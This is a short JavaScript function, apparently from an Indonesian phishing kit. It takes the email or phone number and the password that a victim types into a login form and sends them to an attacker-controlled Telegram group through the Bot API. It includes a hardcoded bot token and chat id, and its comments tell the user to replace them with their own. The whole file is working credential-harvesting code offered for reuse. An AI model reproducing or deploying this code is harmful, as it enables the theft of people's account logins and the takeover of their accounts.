function kirimPesan() {

    var email = document.getElementById('email');
    var pass = document.getElementById('pass');

    var gabungan = 'Email%2FTlp%3A%0A' + email.value + '%0APass%3A%0A' + pass.value;

    var token = '6356869047:AAEEEmpcSPVJ0Jo6-E0Ba78OnnEEFHPmdwU'; // Ganti dengan token bot yang kamu buat
    var grup = '-1002031321163'; // Ganti dengan chat id dari bot yang kamu buat

    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
    })
}